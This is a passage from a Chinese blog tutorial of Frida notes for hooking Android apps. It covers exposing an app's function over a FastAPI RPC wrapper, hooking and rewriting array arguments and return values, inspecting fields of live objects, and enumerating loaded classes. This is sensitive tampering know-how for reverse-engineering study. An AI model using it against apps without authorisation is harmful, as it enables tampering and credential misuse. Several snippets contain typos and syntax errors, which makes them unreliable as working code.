FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get&quot;</span></span>) </span><span class="comment">#注意这里url上没有定义参数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getEchoApi</span>(<span class="params">item_id, item_user, item_pass</span>):</span><br><span class="line">    <span class="comment">#fastapi会聪明的发现它不是URL参数,然后自动将他识别为param参数</span></span><br><span class="line">    <span class="comment">#RPC远程调用</span></span><br><span class="line">    result = script.exports.zxk1ng(item_user, item_pass)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item_retval&quot;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, port = <span class="number">8080</span>)</span><br><span class="line">Hook</span><br></pre></td></tr></table></figure></li></ol><h2 id="参数是数组类型的Hook姿势"><a href="#参数是数组类型的Hook姿势" class="headerlink" title="参数是数组类型的Hook姿势"></a>参数是数组类型的Hook姿势</h2><p>实例如下图</p><p><img src="2025-01-15-frida与Objection/image-20240628140526720.png" alt="image-20240628140526720"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Character Java.use(&quot;java.lang.Character&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当参数是char数组时 ==》Arrays.toString(arr[i])</span></span><br><span class="line">function <span class="title function_">charArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[C&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*进行参数修改</span></span><br><span class="line"><span class="comment">            var myarg=Java.array(&#x27;char&#x27;,[&#x27;1&#x27;,&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">            var result=this.toString(myarg);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;char&#x27;</span>,arg); <span class="comment">//转化为char类型的数 组</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>.toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(str,result);</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当参数是byte数组时 ==》Arrays.toString(Arrays.toString(arr[i]).getBytes())</span></span><br><span class="line">function <span class="title function_">bytesArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">/*使用r0gson.dex</span></span><br><span class="line"><span class="comment">        var gson=Java.openClassFile(&quot;/data/local/tmp/r0gson.dex&quot;).load();</span></span><br><span class="line"><span class="comment">        var gson=Java.use(&quot;com.r0ysue.gson.Gson&quot;);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[B&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;byte&#x27;</span>,arg); <span class="comment">//转化为char类型的数组</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>,toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(<span class="string">&quot;[1]&quot;</span>,str);</span><br><span class="line">            console.log(<span class="string">&quot;[2]&quot;</span>,JSON.stringify(arg));</span><br><span class="line">            console.log(<span class="string">&quot;[3]&quot;</span>,gson.$<span class="keyword">new</span>().toJson(arg)); <span class="comment">//使用r0gson.dex</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;);</span></span><br><span class="line"><span class="comment">console.log(&quot;[4]&quot;,ByteString.of(arg).hex());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法5 申请空间 写入内存 再hexdump </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Java类型类型打印"><a href="#Java类型类型打印" class="headerlink" title="Java类型类型打印"></a>Java类型类型打印</h2><p><img src="2025-01-15-frida与Objection/image-20240628161004005.png" alt="image-20240628161004005"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private char arr[][] = new char [4][];</span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        console.log(<span class="string">&quot;arr&quot;</span>,co_handle.arr.value);</span><br><span class="line">        <span class="keyword">var</span> arr=Java.array(<span class="string">&quot;java.lang.Object&quot;</span>,co_handle.arr.value)</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">             str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">             <span class="keyword">var</span> tmp=Java.array(<span class="string">&quot;char&quot;</span>,arr[i]);</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;tmp.length;j++)&#123;</span><br><span class="line">                 str+=tmp[j]+<span class="string">&quot; &quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             console.log(i,str);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Map&lt;String,String&gt; map = new HashMap&lt;&gt;() </span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> map=Java.cast(co_handle.map.value,Java.use(<span class="string">&quot;java.util.HashMap&quot;</span>)); <span class="comment">//不是基本类型 先进行类型转化</span></span><br><span class="line">        console.log(<span class="string">&quot;map[1]&quot;</span>,map.toString());</span><br><span class="line">        </span><br><span class="line">        console.log(<span class="string">&quot;map[2]&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">iter_entry</span> <span class="operator">=</span> map.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(iter_entry.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> entry=Java.cast(iter_entry.next(),Java.use(<span class="string">&quot;java.util.HashMap$Node&quot;</span>));</span><br><span class="line">            console.log(entry.getKey(),entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         console.log(<span class="string">&quot;map[3]&quot;</span>);</span><br><span class="line">         <span class="type">var</span> <span class="variable">iter_key</span> <span class="operator">=</span> map.keySet().iterator();</span><br><span class="line">         <span class="keyword">while</span>(iter_key.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> key=iter_key.next();</span><br><span class="line">            console.log(key,map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;类全路径&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">     <span class="comment">//Signal color = Signal.RED;</span></span><br><span class="line">        <span class="keyword">var</span> color=Java.cast(co_handle.color.value,Java.use(<span class="string">&quot;xxx.classname$Signal&quot;</span>));</span><br><span class="line">        console.log(color.toString());</span><br><span class="line">        console.log(color.name());     </span><br><span class="line">        console.log(color.ordinal());  <span class="comment">//打印索引</span></span><br><span class="line">     <span class="comment">//Water wJuice = new Juice()</span></span><br><span class="line">        <span class="keyword">var</span> wJuice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Water&quot;</span>) );</span><br><span class="line">        console.log(wJuice.still(wJuice),wJuice.flow(wJuice));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> juice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Juice&quot;</span>) );    </span><br><span class="line">        console.log(juice.still(juice),juice.flow(juice),juice.fillEnergy());</span><br><span class="line">      <span class="comment">// CheerInterface ibeer = new IBeer() 在IBeer中实现这个接口中方法 </span></span><br><span class="line">        <span class="keyword">var</span> beer=Java.cast(co_handle.ibeer.value,Java.use(<span class="string">&quot;xxx.xxx.IBeer&quot;</span>));    </span><br><span class="line">        console.log(beer.cheer());</span><br><span class="line">         <span class="comment">//自己实现接口构造</span></span><br><span class="line">        <span class="keyword">var</span> CheerInterface=Java.use(<span class="string">&quot;xxx.xxx.CheerInterface&quot;</span>); </span><br><span class="line">        <span class="keyword">var</span> mybeer=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;xxx.xxx.beer&quot;</span>,  <span class="comment">//实现的类名，应该是自定义</span></span><br><span class="line">            implements:[CheerInterface], <span class="comment">//实现的接口数组</span></span><br><span class="line">            methods:&#123;              <span class="comment">//实现的方法</span></span><br><span class="line">                cheer:function()&#123;</span><br><span class="line">                    console.log(<span class="string">&quot;CHEER!!!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        mybeer.$<span class="keyword">new</span>().cheer();</span><br><span class="line">    &#125;)   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="2025-01-15-frida与Objection/image-20240628202422344.png" alt="image-20240628202422344"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当返回值和参数是 Object[]</span></span><br><span class="line">function <span class="title function_">hookFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Array=Java.use(<span class="string">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class="line">        Java.use(<span class="string">&quot;xxx.xxx.xxxx&quot;</span>).funFunc.implementation=funciton(arg)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;arg&quot;</span>,arg);</span><br><span class="line">            <span class="keyword">var</span> arr=arg[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> arr_len=Array.getLength(arr);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i;i&lt;arr_len;i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> item=Array.get(arr,i);</span><br><span class="line">                <span class="keyword">var</span> item_len=Array.getLength(item);                </span><br><span class="line">                <span class="keyword">var</span> item_s=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;item_len;j++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ch=Array.getChar(item,i);</span><br><span class="line">                    item_s+=ch+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(item_s);</span><br><span class="line">                </span><br><span class="line">            &#125;           </span><br><span class="line">            </span><br><span class="line">            <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.funFunc(arg);</span><br><span class="line">            console.log(<span class="string">&quot;result&quot;</span>,result);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//对于返回结果的数组的第4个元素</span></span><br><span class="line">            <span class="keyword">var</span> arr=result[<span class="number">3</span>];</span><br><span class="line">            console.log(Array.get(arr,<span class="number">0</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">1</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">2</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">3</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">4</span>));</span><br><span class="line">            </span><br><span class="line">            result=Java.array(<span class="string">&#x27;Ljava.lang.Object;&#x27;</span>,[Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$<span class="keyword">new</span>(<span class="number">10</span>),Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$<span class="keyword">new</span>(<span class="string">&#x27;hello&#x27;</span>)])</span><br><span class="line">            <span class="keyword">return</span> result;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">thread</span><span class="params">()</span>&#123;</span><br><span class="line">Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Runnable=Java.use(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Thread=Java.use(<span class="string">&quot;java.lang.Thread&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> MyRunnable=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;com.xxx.xxx.murunnable&quot;</span>,</span><br><span class="line">            implements:[Runnable],</span><br><span class="line">            fields:&#123;</span><br><span class="line">                num:<span class="string">&quot;int&quot;</span>,</span><br><span class="line">                str:<span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                $init:[&#123;</span><br><span class="line">                    returnType:<span class="string">&quot;void&quot;</span>,</span><br><span class="line">                    argumentTypes:[<span class="string">&#x27;int&#x27;</span>,<span class="string">&quot;java.lang.String&quot;</span>],</span><br><span class="line">                    implementation:function(num,str)&#123;</span><br><span class="line">                        <span class="built_in">this</span>.num.value=num;</span><br><span class="line">                        <span class="built_in">this</span>.str.value=str;</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;],</span><br><span class="line">                run:function()&#123;</span><br><span class="line">                    <span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">                        console.log(<span class="built_in">this</span>.num.value,<span class="built_in">this</span>.str.value);</span><br><span class="line">                        <span class="built_in">this</span>.num.value=<span class="built_in">this</span>.num.value+<span class="number">1</span>;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> run1=MyRunnable.$<span class="keyword">new</span>(<span class="number">10</span>,<span class="string">&quot;run1&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> run2=MyRunnable.$<span class="keyword">new</span>(<span class="number">20</span>,<span class="string">&quot;run2&quot;</span>);</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run1).start();</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run2).start();          </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(thread,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="内存搜索接口实现类"><a href="#内存搜索接口实现类" class="headerlink" title="内存搜索接口实现类"></a>内存搜索接口实现类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">findAllInterfaces</span><span class="params">(packnames)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    console.log(class_name,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        console.log(<span class="string">&quot;\t&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">findAllInterfaces(<span class="string">&quot;要抓取的包名&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出指定的接口所在的类</span></span><br><span class="line">function <span class="title function_">findImpByInterface</span><span class="params">(packnames,interfaceName)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;                </span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interfaces[i].toSting().indexOf(interfaceName))&#123;</span><br><span class="line">                            console.log(class_name,<span class="string">&quot;:&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象类-父类"><a href="#抽象类-父类" class="headerlink" title="抽象类(父类)"></a>抽象类(父类)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">findAllSuperclasses</span>(<span class="params">packnames</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(class_name,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 